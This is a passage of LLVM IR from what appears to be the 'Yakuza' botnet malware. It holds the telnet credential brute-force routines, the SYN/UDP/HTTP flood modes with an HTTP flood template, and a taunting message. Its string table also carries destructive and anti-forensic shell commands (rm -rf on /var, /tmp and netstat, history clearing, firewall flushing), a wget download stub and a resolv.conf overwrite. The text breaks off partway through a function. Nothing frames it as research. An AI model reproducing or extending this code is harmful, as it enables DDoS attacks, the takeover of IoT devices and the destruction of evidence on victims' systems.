@.str.125 = private unnamed_addr constant [72 x i8] c"[ Yakuza ] Failed || IP: %s || Port: 23 || Username: %s || Password: %s\00", align 1
@SendSTD.randstrings = private unnamed_addr constant [26 x i8*] [i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.126, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.127, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.128, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.129, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.130, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.131, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.132, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.133, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.134, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.135, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.136, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.137, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.138, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.139, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.140, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.141, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.142, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.143, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.144, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.145, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.146, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.147, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.148, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.149, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.150, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.151, i32 0, i32 0)], align 16
@.str.126 = private unnamed_addr constant [21 x i8] c"PozHlpiND4xPDPuGE6tq\00", align 1
@.str.127 = private unnamed_addr constant [21 x i8] c"tg57YSAcuvy2hdBlEWMv\00", align 1
@.str.128 = private unnamed_addr constant [21 x i8] c"VaDp3Vu5m5bKcfCU96RX\00", align 1
@.str.129 = private unnamed_addr constant [21 x i8] c"UBWcPjIZOdZ9IAOSZAy6\00", align 1
@.str.130 = private unnamed_addr constant [21 x i8] c"JezacHw4VfzRWzsglZlF\00", align 1
@.str.131 = private unnamed_addr constant [21 x i8] c"3zOWSvAY2dn9rKZZOfkJ\00", align 1
@.str.132 = private unnamed_addr constant [21 x i8] c"oqogARpMjAvdjr9Qsrqj\00", align 1
@.str.133 = private unnamed_addr constant [21 x i8] c"yQAkUvZFjxExI3WbDp2g\00", align 1
@.str.134 = private unnamed_addr constant [21 x i8] c"35arWHE38SmV9qbaEDzZ\00", align 1
@.str.135 = private unnamed_addr constant [21 x i8] c"kKbPlhAwlxxnyfM3LaL0\00", align 1
@.str.136 = private unnamed_addr constant [21 x i8] c"a7pInUoLgx1CPFlGB5JF\00", align 1
@.str.137 = private unnamed_addr constant [21 x i8] c"yFnlmG7bqbW682p7Bzey\00", align 1
@.str.138 = private unnamed_addr constant [21 x i8] c"S1mQMZYF6uLzzkiULnGF\00", align 1
@.str.139 = private unnamed_addr constant [21 x i8] c"jKdmCH3hamvbN7ZvzkNA\00", align 1
@.str.140 = private unnamed_addr constant [21 x i8] c"bOAFqQfhvMFEf9jEZ89M\00", align 1
@.str.141 = private unnamed_addr constant [21 x i8] c"VckeqgSPaAA5jHdoFpCC\00", align 1
@.str.142 = private unnamed_addr constant [21 x i8] c"CwT01MAGqrgYRStHcV0X\00", align 1
@.str.143 = private unnamed_addr constant [21 x i8] c"72qeggInemBIQ5uJc1jQ\00", align 1
@.str.144 = private unnamed_addr constant [21 x i8] c"zwcfbtGDTDBWImROXhdn\00", align 1
@.str.145 = private unnamed_addr constant [21 x i8] c"w70uUC1UJYZoPENznHXB\00", align 1
@.str.146 = private unnamed_addr constant [21 x i8] c"EoXLAf1xXR7j4XSs0JTm\00", align 1
@.str.147 = private unnamed_addr constant [21 x i8] c"lgKjMnqBZFEvPJKpRmMj\00", align 1
@.str.148 = private unnamed_addr constant [21 x i8] c"lSvZgNzxkUyChyxw1nSr\00", align 1
@.str.149 = private unnamed_addr constant [21 x i8] c"VQz4cDTxV8RRrgn00toF\00", align 1
@.str.150 = private unnamed_addr constant [13 x i8] c"YakuzaBotnet\00", align 1
@.str.151 = private unnamed_addr constant [13 x i8] c"Scarface1337\00", align 1
@.str.152 = private unnamed_addr constant [4 x i8] c"ALL\00", align 1
@.str.153 = private unnamed_addr constant [5 x i8] c"USYN\00", align 1
@.str.154 = private unnamed_addr constant [5 x i8] c"ASYN\00", align 1
@.str.155 = private unnamed_addr constant [2 x i8] c"-\00", align 1
@.str.156 = private unnamed_addr constant [4 x i8] c"SYN\00", align 1
@.str.157 = private unnamed_addr constant [4 x i8] c"RST\00", align 1
@.str.158 = private unnamed_addr constant [4 x i8] c"FIN\00", align 1
@.str.159 = private unnamed_addr constant [4 x i8] c"ACK\00", align 1
@.str.160 = private unnamed_addr constant [4 x i8] c"PSH\00", align 1
@.str.161 = private unnamed_addr constant [4 x i8] c"URG\00", align 1
@.str.162 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.163 = private unnamed_addr constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00", align 1
@.str.164 = private unnamed_addr constant [285 x i8] c"\84\8B\87\8F\99\8F\98\9C\8F\98\84\8B\87\8F\99\8F\98\9C\8F\98\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\00", align 1
@.str.165 = private unnamed_addr constant [48 x i8] c"Yakuza Botnet HTTP Flood In Progress. Fuck you.\00", align 1
@.str.166 = private unnamed_addr constant [43 x i8] c"rm -rf /tmp/* /var/* /var/run/* /var/tmp/*\00", align 1
@.str.167 = private unnamed_addr constant [21 x i8] c"rm -rf /var/log/wtmp\00", align 1
@.str.168 = private unnamed_addr constant [14 x i8] c"rm -rf /tmp/*\00", align 1
@.str.169 = private unnamed_addr constant [20 x i8] c"rm -rf /bin/netstat\00", align 1
@.str.170 = private unnamed_addr constant [12 x i8] c"iptables -F\00", align 1
@.str.171 = private unnamed_addr constant [17 x i8] c"pkill -9 busybox\00", align 1
@.str.172 = private unnamed_addr constant [14 x i8] c"pkill -9 perl\00", align 1
@.str.173 = private unnamed_addr constant [16 x i8] c"pkill -9 python\00", align 1
@.str.174 = private unnamed_addr constant [22 x i8] c"service iptables stop\00", align 1
@.str.175 = private unnamed_addr constant [37 x i8] c"/sbin/iptables -F; /sbin/iptables -X\00", align 1
@.str.176 = private unnamed_addr constant [23 x i8] c"service firewalld stop\00", align 1
@.str.177 = private unnamed_addr constant [23 x i8] c"rm -rf ~/.bash_history\00", align 1
@.str.178 = private unnamed_addr constant [11 x i8] c"history -c\00", align 1
@.str.179 = private unnamed_addr constant [45 x i8] c"wget --no-check-certificate -q -O /tmp/null \00", align 1
@.str.180 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.181 = private unnamed_addr constant [5 x i8] c"ICMP\00", align 1
@.str.182 = private unnamed_addr constant [7 x i8] c"TELNET\00", align 1
@.str.183 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.184 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.185 = private unnamed_addr constant [6 x i8] c"FLOAD\00", align 1
@.str.186 = private unnamed_addr constant [21 x i8] c"FLoad Mode Activated\00", align 1
@.str.187 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.188 = private unnamed_addr constant [8 x i8] c"HTTPHEX\00", align 1
@.str.189 = private unnamed_addr constant [8 x i8] c"HTTPTXT\00", align 1
@.str.190 = private unnamed_addr constant [5 x i8] c"WGET\00", align 1
@.str.191 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.192 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.193 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.194 = private unnamed_addr constant [5 x i8] c"STOP\00", align 1
@.str.195 = private unnamed_addr constant [6 x i8] c"CLEAN\00", align 1
@.str.196 = private unnamed_addr constant [19 x i8] c"[Cleaning] [%s:%s]\00", align 1
@.str.200 = private unnamed_addr constant [14 x i8] c"LITTLE_ENDIAN\00", align 1
@.str.197 = private unnamed_addr constant [17 x i8] c"/etc/resolv.conf\00", align 1
@.str.198 = private unnamed_addr constant [39 x i8] c"nameserver 8.8.8.8\0Anameserver 8.8.4.4\0A\00", align 1
@.str.204 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.205 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.206 = private unnamed_addr constant [55 x i8] c"[\1B[96mBOT JOINED\1B[97m] Arch: \1B[96m%s \1B[97m|| Type: %s]\00", align 1
@.str.207 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.208 = private unnamed_addr constant [2 x i8] c" \00", align 1
@getRandomPublicIP.ipState.0 = internal unnamed_addr global i8 0, align 1
@getRandomPublicIP.ipState.1 = internal unnamed_addr global i8 0, align 1
@getRandomPublicIP.ipState.2 = internal unnamed_addr global i8 0, align 1
@getRandomPublicIP.ipState.3 = internal unnamed_addr global i8 0, align 1
@TelnetIPRanges.ipState.0 = internal unnamed_addr global i8 0, align 1
@TelnetIPRanges.ipState.1 = internal unnamed_addr global i8 0, align 1
@TelnetIPRanges.ipState.2 = internal unnamed_addr global i8 0, align 1
@TelnetIPRanges.ipState.3 = internal unnamed_addr global i8 0, align 1

; Function Attrs: noinline norecurse nounwind readnone uwtable
define i8* @getBuild() local_unnamed_addr #0 {
  ret i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.53, i64 0, i64 0)
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @init_rand(i32) local_unnamed_addr #1 {
min.iters.checked:
  store i32 %0, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %1 = add i32 %0, -1640531527
  store i32 %1, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %2 = add i32 %0, 1013904242
  store i32 %2, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  %vector.recur.init = insertelement <2 x i32> undef, i32 %0, i32 1
  %load_initial = load <2 x i32>, <2 x i32>* bitcast (i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1) to <2 x i32>*), align 4
  br label %vector.body

vector.body:                                      ; preds = %vector.body, %min.iters.checked
  %store_forwarded = phi <2 x i32> [ %load_initial, %min.iters.checked ], [ %16, %vector.body ]
  %index = phi i64 [ 0, %min.iters.checked ], [ %index.next.1, %vector.body ]
  %vector.recur = phi <2 x i32> [ %vector.recur.init, %min.iters.checked ], [ %8, %vector.body ]
  %vec.ind = phi <2 x i64> [ <i64 3, i64 4>, %min.iters.checked ], [ %vec.ind.next.1, %vector.body ]
  %3 = or i64 %index, 3
  %4 = shufflevector <2 x i32> %vector.recur, <2 x i32> %store_forwarded, <2 x i32> <i32 1, i32 2>
  %5 = trunc <2 x i64> %vec.ind to <2 x i32>
  %6 = xor <2 x i32> %5, <i32 -1640531527, i32 -1640531527>
  %7 = xor <2 x i32> %6, %4
  %8 = xor <2 x i32> %7, %store_forwarded
  %9 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %3
  %10 = bitcast i32* %9 to <2 x i32>*
  store <2 x i32> %8, <2 x i32>* %10, align 4
  %vec.ind.next = add <2 x i64> %vec.ind, <i64 2, i64 2>
  %11 = add nsw i64 %index, 5
  %12 = shufflevector <2 x i32> %store_forwarded, <2 x i32> %8, <2 x i32> <i32 1, i32 2>
  %13 = trunc <2 x i64> %vec.ind.next to <2 x i32>
  %14 = xor <2 x i32> %13, <i32 -1640531527, i32 -1640531527>
  %15 = xor <2 x i32> %14, %12
  %16 = xor <2 x i32> %15, %8
  %17 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %11
  %18 = bitcast i32* %17 to <2 x i32>*
  store <2 x i32> %16, <2 x i32>* %18, align 4
  %index.next.1 = add nsw i64 %index, 4
  %vec.ind.next.1 = add <2 x i64> %vec.ind, <i64 4, i64 4>
  %19 = icmp eq i64 %index.next.1, 4092
  br i1 %19, label %middle.block, label %vector.body, !llvm.loop !1

middle.block:                                     ; preds = %vector.body
  br label %._crit_edge

._crit_edge:                                      ; preds = %middle.block
  %vector.recur.extract = extractelement <2 x i32> %8, i32 1
  %20 = load i32, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 4093), align 4
  %21 = xor i32 %vector.recur.extract, -1640532410
  %22 = xor i32 %21, %20
  store i32 %22, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 4095), align 4
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define i32 @rand_cmwc() local_unnamed_addr #1 {
  %1 = load i32, i32* @rand_cmwc.i, align 4
  %2 = add i32 %1, 1
  %3 = and i32 %2, 4095
  store i32 %3, i32* @rand_cmwc.i, align 4
  %4 = zext i32 %3 to i64
  %5 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %4
  %6 = load i32, i32* %5, align 4
  %7 = zext i32 %6 to i64
  %8 = mul nuw nsw i64 %7, 18782
  %9 = load i32, i32* @c, align 4
  %10 = zext i32 %9 to i64
  %11 = add nuw nsw i64 %8, %10
  %12 = lshr i64 %11, 32
  %13 = trunc i64 %12 to i32
  %14 = add nuw nsw i64 %12, %11
  %15 = trunc i64 %14 to i32
  %16 = icmp ult i32 %15, %13
  %17 = zext i1 %16 to i32
  %storemerge = add nuw nsw i32 %17, %13
  store i32 %storemerge, i32* @c, align 4
  %.neg7 = sext i1 %16 to i32
  %.0.neg = sub i32 -2, %15
  %18 = add i32 %.0.neg, %.neg7
  store i32 %18, i32* %5, align 4
  ret i32 %18
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_string(i8*, i8** nocapture readonly) local_unnamed_addr #2 {
  br label %3

; <label>:3:                                      ; preds = %3, %2
  %indvars.iv13 = phi i64 [ %indvars.iv.next14, %3 ], [ 0, %2 ]
  %indvars.iv.next14 = add nuw nsw i64 %indvars.iv13, 1
  %4 = getelementptr inbounds i8*, i8** %1, i64 %indvars.iv.next14
  %5 = load i8*, i8** %4, align 8
  %6 = icmp eq i8* %5, null
  br i1 %6, label %.preheader, label %3

.preheader:                                       ; preds = %3
  %7 = trunc i64 %indvars.iv13 to i32
  %8 = icmp slt i32 %7, 0
  br i1 %8, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  %sext = shl i64 %indvars.iv13, 32
  %9 = ashr exact i64 %sext, 32
  br label %.lr.ph

; <label>:10:                                     ; preds = %.lr.ph
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %11 = icmp slt i64 %indvars.iv, %9
  br i1 %11, label %.lr.ph, label %._crit_edge.loopexit

.lr.ph:                                           ; preds = %.lr.ph.preheader, %10
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %10 ]
  %12 = getelementptr inbounds i8*, i8** %1, i64 %indvars.iv
  %13 = load i8*, i8** %12, align 8
  %14 = tail call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %0, i8* %13) #7
  %15 = icmp eq i32 %14, 0
  br i1 %15, label %10, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph, %10
  %.09.ph = phi i32 [ 0, %10 ], [ 1, %.lr.ph ]
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.09 = phi i32 [ 0, %.preheader ], [ %.09.ph, %._crit_edge.loopexit ]
  ret i32 %.09
}

declare i32 @strcasestr(...) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define i32 @contains_success(i8*) local_unnamed_addr #2 {
  %2 = tail call i32 @contains_string(i8* %0, i8** getelementptr inbounds ([18 x i8*], [18 x i8*]* @successes, i64 0, i64 0))
  ret i32 %2
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_fail(i8*) local_unnamed_addr #2 {
  %2 = tail call i32 @contains_string(i8* %0, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @fails, i64 0, i64 0))
  ret i32 %2
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_response(i8*) local_unnamed_addr #2 {
  %2 = tail call i32 @contains_success(i8* %0)
  %3 = icmp eq i32 %2, 0
  br i1 %3, label %4, label %7

; <label>:4:                                      ; preds = %1
  %5 = tail call i32 @contains_fail(i8* %0)
  %6 = icmp ne i32 %5, 0
  br label %7

; <label>:7:                                      ; preds = %1, %4
  %8 = phi i1 [ true, %1 ], [ %6, %4 ]
  %9 = zext i1 %8 to i32
  ret i32 %9
}

; Function Attrs: noinline nounwind uwtable
define i32 @read_with_timeout(i32, i32, i8*, i32) local_unnamed_addr #2 {
  %5 = alloca %struct.fd_set, align 8
  %6 = alloca %struct.timeval, align 8
  %7 = getelementptr inbounds %struct.timeval, %struct.timeval* %6, i64 0, i32 0
  store i64 0, i64* %7, align 8
  %8 = sext i32 %1 to i64
  %9 = getelementptr inbounds %struct.timeval, %struct.timeval* %6, i64 0, i32 1
  store i64 %8, i64* %9, align 8
  %10 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %5, i64 0, i32 0, i64 0
  %11 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %10) #7, !srcloc !4
  %12 = srem i32 %0, 64
  %13 = zext i32 %12 to i64
  %14 = shl i64 1, %13
  %15 = sdiv i32 %0, 64
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %5, i64 0, i32 0, i64 %16
  %18 = load i64, i64* %17, align 8
  %19 = or i64 %18, %14
  store i64 %19, i64* %17, align 8
  %20 = add nsw i32 %0, 1
  %21 = call i32 @select(i32 %20, %struct.fd_set* nonnull %5, %struct.fd_set* null, %struct.fd_set* null, %struct.timeval* nonnull %6) #7
  %22 = icmp slt i32 %21, 1
  br i1 %22, label %27, label %23

; <label>:23:                                     ; preds = %4
  %24 = sext i32 %3 to i64
  %25 = call i64 @recv(i32 %0, i8* %2, i64 %24, i32 0) #7
  %26 = trunc i64 %25 to i32
  br label %27

; <label>:27:                                     ; preds = %4, %23
  %.0 = phi i32 [ %26, %23 ], [ 0, %4 ]
  ret i32 %.0
}

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) local_unnamed_addr #3

declare i64 @recv(i32, i8*, i64, i32) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define i32 @read_until_response(i32, i32, i8*, i32, i8** nocapture readonly) local_unnamed_addr #2 {
  %6 = sext i32 %3 to i64
  tail call void @llvm.memset.p0i8.i64(i8* %2, i8 0, i64 %6, i32 1, i1 false)
  %7 = tail call i32 @read_with_timeout(i32 %0, i32 %1, i8* %2, i32 %3)
  %8 = tail call i32 @contains_string(i8* %2, i8** %4)
  %not. = icmp ne i32 %8, 0
  %.0 = zext i1 %not. to i32
  ret i32 %.0
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #4

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) local_unnamed_addr #2 {
  %4 = alloca i8, align 1
  %5 = getelementptr inbounds i8, i8* %1, i64 1
  %6 = load i8, i8* %5, align 1
  %.off = add i8 %6, 5
  %switch = icmp ult i8 %.off, 4
  br i1 %switch, label %7, label %20

; <label>:7:                                      ; preds = %3
  store i8 -1, i8* %4, align 1
  %8 = call i64 @send(i32 %0, i8* nonnull %4, i64 1, i32 16384) #7
  %9 = load i8, i8* %5, align 1
  switch i8 %9, label %13 [
    i8 -4, label %10
    i8 -2, label %11
    i8 3, label %12
  ]

; <label>:10:                                     ; preds = %7
  store i8 -2, i8* %4, align 1
  br label %16

; <label>:11:                                     ; preds = %7
  store i8 -4, i8* %4, align 1
  br label %16

; <label>:12:                                     ; preds = %7
  store i8 -3, i8* %4, align 1
  br label %16

; <label>:13:                                     ; preds = %7
  %14 = icmp eq i8 %9, -3
  %15 = select i1 %14, i8 -4, i8 -2
  store i8 %15, i8* %4, align 1
  br label %16

; <label>:16:                                     ; preds = %11, %13, %12, %10
  %17 = call i64 @send(i32 %0, i8* nonnull %4, i64 1, i32 16384) #7
  %18 = getelementptr inbounds i8, i8* %1, i64 2
  %19 = call i64 @send(i32 %0, i8* %18, i64 1, i32 16384) #7
  br label %20

; <label>:20:                                     ; preds = %3, %16
  ret i32 0
}

declare i64 @send(i32, i8*, i64, i32) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define i8* @get_telstate_host(%struct.telstate_t* nocapture readonly) local_unnamed_addr #2 {
  %2 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %0, i64 0, i32 1
  %3 = load i32, i32* %2, align 4
  %4 = tail call i8* @inet_ntoa(i32 %3) #7
  ret i8* %4
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define void @advance_telstate(%struct.telstate_t* nocapture, i32) local_unnamed_addr #2 {
  %3 = icmp eq i32 %1, 0
  br i1 %3, label %4, label %8

; <label>:4:                                      ; preds = %2
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %0, i64 0, i32 0
  %6 = load i32, i32* %5, align 8
  %7 = tail call i32 @close(i32 %6) #7
  br label %8

; <label>:8:                                      ; preds = %4, %2
  %9 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %0, i64 0, i32 7
  store i32 0, i32* %9, align 8
  %10 = trunc i32 %1 to i8
  %11 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %0, i64 0, i32 2
  store i8 %10, i8* %11, align 8
  %12 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %0, i64 0, i32 9
  %13 = load i8*, i8** %12, align 8
  tail call void @llvm.memset.p0i8.i64(i8* %13, i8 0, i64 1024, i32 1, i1 false)
  ret void
}

declare i32 @close(i32) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define void @reset_telstate(%struct.telstate_t* nocapture) local_unnamed_addr #2 {
  tail call void @advance_telstate(%struct.telstate_t* %0, i32 0)
  %2 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %0, i64 0, i32 3
  store i8 1, i8* %2, align 1
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8* nocapture) local_unnamed_addr #2 {
  %2 = tail call i64 @strlen(i8* %0) #14
  %3 = add i64 %2, 4294967295
  br label %4

; <label>:4:                                      ; preds = %4, %1
  %indvars.iv29 = phi i64 [ %indvars.iv.next30, %4 ], [ 0, %1 ]
  %5 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv29
  %6 = load i8, i8* %5, align 1
  %7 = sext i8 %6 to i32
  %8 = tail call i32 @isspace(i32 %7) #14
  %9 = icmp eq i32 %8, 0
  %indvars.iv.next30 = add nuw i64 %indvars.iv29, 1
  br i1 %9, label %.preheader, label %4

.preheader:                                       ; preds = %4
  %10 = trunc i64 %3 to i32
  %11 = trunc i64 %indvars.iv29 to i32
  %12 = icmp slt i32 %10, %11
  br i1 %12, label %.critedge.preheader, label %.lr.ph22.preheader

.lr.ph22.preheader:                               ; preds = %.preheader
  %sext = shl i64 %3, 32
  %13 = ashr exact i64 %sext, 32
  %sext31 = shl i64 %indvars.iv29, 32
  %14 = ashr exact i64 %sext31, 32
  br label %.lr.ph22

.critedge.preheader.loopexit:                     ; preds = %.lr.ph22, %80
  %.0.lcssa.ph = phi i32 [ %79, %.lr.ph22 ], [ %81, %80 ]
  br label %.critedge.preheader

.critedge.preheader:                              ; preds = %.critedge.preheader.loopexit, %.preheader
  %.0.lcssa = phi i32 [ %10, %.preheader ], [ %.0.lcssa.ph, %.critedge.preheader.loopexit ]
  %15 = icmp sgt i32 %11, %.0.lcssa
  br i1 %15, label %.critedge._crit_edge, label %.critedge.preheader26

.critedge.preheader26:                            ; preds = %.critedge.preheader
  %sext32 = shl i64 %indvars.iv29, 32
  %16 = ashr exact i64 %sext32, 32
  %17 = sext i32 %.0.lcssa to i64
  %18 = icmp sgt i64 %17, %16
  %smax = select i1 %18, i64 %17, i64 %16
  %19 = add nsw i64 %smax, 1
  %20 = sub nsw i64 %19, %16
  %min.iters.check = icmp ult i64 %20, 32
  br i1 %min.iters.check, label %.critedge.preheader39, label %min.iters.checked

.critedge.preheader39:                            ; preds = %middle.block, %vector.memcheck, %min.iters.checked, %.critedge.preheader26
  %indvars.iv.ph = phi i64 [ %16, %vector.memcheck ], [ %16, %min.iters.checked ], [ %16, %.critedge.preheader26 ], [ %ind.end, %middle.block ]
  br label %.critedge

min.iters.checked:                                ; preds = %.critedge.preheader26
  %n.vec = and i64 %20, -32
  %cmp.zero = icmp eq i64 %n.vec, 0
  br i1 %cmp.zero, label %.critedge.preheader39, label %vector.memcheck

vector.memcheck:                                  ; preds = %min.iters.checked
  %21 = icmp sgt i64 %17, %16
  %smax34 = select i1 %21, i64 %17, i64 %16
  %22 = add nsw i64 %smax34, 1
  %23 = sub nsw i64 %22, %16
  %scevgep = getelementptr i8, i8* %0, i64 %23
  %scevgep35 = getelementptr i8, i8* %0, i64 %16
  %scevgep36 = getelementptr i8, i8* %0, i64 %22
  %bound0 = icmp ugt i8* %scevgep36, %0
  %bound1 = icmp ult i8* %scevgep35, %scevgep
  %memcheck.conflict = and i1 %bound0, %bound1
  %ind.end = add nsw i64 %16, %n.vec
  br i1 %memcheck.conflict, label %.critedge.preheader39, label %vector.body.preheader

vector.body.preheader:                            ; preds = %vector.memcheck
  %24 = add nsw i64 %n.vec, -32
  %25 = lshr exact i64 %24, 5
  %26 = add nuw nsw i64 %25, 1
  %xtraiter = and i64 %26, 3
  %lcmp.mod = icmp eq i64 %xtraiter, 0
  br i1 %lcmp.mod, label %vector.body.prol.loopexit, label %vector.body.prol.preheader

vector.body.prol.preheader:                       ; preds = %vector.body.preheader
  br label %vector.body.prol

vector.body.prol:                                 ; preds = %vector.body.prol, %vector.body.prol.preheader
  %index.prol = phi i64 [ %index.next.prol, %vector.body.prol ], [ 0, %vector.body.prol.preheader ]
  %prol.iter = phi i64 [ %prol.iter.sub, %vector.body.prol ], [ %xtraiter, %vector.body.prol.preheader ]
  %27 = add i64 %16, %index.prol
  %28 = getelementptr inbounds i8, i8* %0, i64 %27
  %29 = bitcast i8* %28 to <16 x i8>*
  %wide.load.prol = load <16 x i8>, <16 x i8>* %29, align 1, !alias.scope !5
  %30 = getelementptr i8, i8* %28, i64 16
  %31 = bitcast i8* %30 to <16 x i8>*
  %wide.load38.prol = load <16 x i8>, <16 x i8>* %31, align 1, !alias.scope !5
  %32 = getelementptr inbounds i8, i8* %0, i64 %index.prol
  %33 = bitcast i8* %32 to <16 x i8>*
  store <16 x i8> %wide.load.prol, <16 x i8>* %33, align 1, !alias.scope !8, !noalias !5
  %34 = getelementptr i8, i8* %32, i64 16
  %35 = bitcast i8* %34 to <16 x i8>*
  store <16 x i8> %wide.load38.prol, <16 x i8>* %35, align 1, !alias.scope !8, !noalias !5
  %index.next.prol = add i64 %index.prol, 32
  %prol.iter.sub = add i64 %prol.iter, -1
  %prol.iter.cmp = icmp eq i64 %prol.iter.sub, 0
